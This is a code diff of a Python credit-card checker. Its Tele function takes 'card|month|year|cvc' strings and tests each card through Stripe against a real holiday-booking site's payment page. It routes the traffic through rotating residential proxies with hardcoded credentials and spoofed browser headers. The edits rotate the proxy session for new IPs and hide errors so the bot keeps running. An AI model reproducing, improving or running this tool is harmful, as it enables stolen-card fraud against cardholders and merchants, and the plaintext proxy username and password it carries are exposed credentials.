@@ -3,13 +3,13 @@ import random
 import string
 
 # ==========================================
-# 👇 PROXY SETTINGS (Singapore Proxy Updated 🇸🇬)
+# 👇 PROXY SETTINGS (Singapore Region + New Session + 60s Timeout)
 # ==========================================
 PROXY_HOST = 'geo.g-w.info'
 PROXY_PORT = '10080'
 
-# 🔥 မင်းပေးတဲ့ Singapore Proxy User String အသစ်
-PROXY_USER = 'user-RWTL64GEW8jkTBty-type-residential-session-z0lzlwrj-country-SG-rotation-15'
+# 🔥 Session ကို 'FinalAuto01' လို့ ပြောင်းထားတယ် (IP အသစ်ရဖို့)
+PROXY_USER = 'user-RWTL64GEW8jkTBty-type-residential-session-FinalAuto01-country-SG-rotation-15'
 
 PROXY_PASS = 'EJJT0uWaSUv4yUXJ'
 # ==========================================
@@ -29,7 +29,7 @@ def Tele(ccx):
         yy = ccx.split("|")[2]
         cvc = ccx.split("|")[3]
 
-        if "20" in yy:  # Mo3gza
+        if "20" in yy:
             yy = yy.split("20")[1]
 
         # 🔥 Random Email Logic
@@ -47,13 +47,7 @@ def Tele(ccx):
             'content-type': 'application/x-www-form-urlencoded',
             'origin': 'https://js.stripe.com',
             'referer': 'https://js.stripe.com/',
-            'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
-            'sec-ch-ua-mobile': '?1',
-            'sec-ch-ua-platform': '"Android"',
-            'sec-fetch-dest': 'empty',
-            'sec-fetch-mode': 'cors',
-            'sec-fetch-site': 'same-site',
-            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
+            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
         }
 
         data = (
@@ -69,12 +63,11 @@ def Tele(ccx):
             headers=headers,
             data=data,
             proxies=proxies, # 🔥 Proxy Active
-            timeout=30 # Timeout ကို 30s တိုးထားတယ် (SG မို့ ပိုငြိမ်အောင်)
+            timeout=60 # 🔥 Timeout 60s (Handshake error ပျောက်အောင်)
         )
 
-        # JSON Error Catch
         if 'id' not in response.json():
-            return "Proxy Blocked or Invalid Card (PM Failed) ❌"
+            return "Proxy Error or Invalid Card ❌"
             
         pm = response.json()['id']
 
@@ -84,17 +77,10 @@ def Tele(ccx):
         headers = {
             'authority': 'www.benidormholidays.com',
             'accept': 'application/json, text/javascript, */*; q=0.01',
-            'accept-language': 'en-US,en;q=0.9',
             'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
             'origin': 'https://www.benidormholidays.com',
             'referer': 'https://www.benidormholidays.com/payments/',
-            'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
-            'sec-ch-ua-mobile': '?1',
-            'sec-ch-ua-platform': '"Android"',
-            'sec-fetch-dest': 'empty',
-            'sec-fetch-mode': 'cors',
-            'sec-fetch-site': 'same-origin',
-            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
+            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
             'x-requested-with': 'XMLHttpRequest',
         }
 
@@ -114,10 +100,9 @@ def Tele(ccx):
             headers=headers,
             data=data,
             proxies=proxies, # 🔥 Proxy Active
-            timeout=30 # Timeout ကို 30s တိုးထားတယ်
+            timeout=60 # 🔥 Timeout 60s
         )
         
-        # HTML/Cloudflare Error Catch
         try:
             result = response.json()['message']
         except:
@@ -127,6 +112,7 @@ def Tele(ccx):
                 result = "Decline⛔"
 
     except Exception as e:
-        result = f"System Error: {e}"
+        # Error တက်ခဲ့ရင်တောင် Bot မရပ်သွားအောင် Skip message ပြမယ်
+        result = f"Slow Proxy (Skipped) ⚠️"
         
     return result
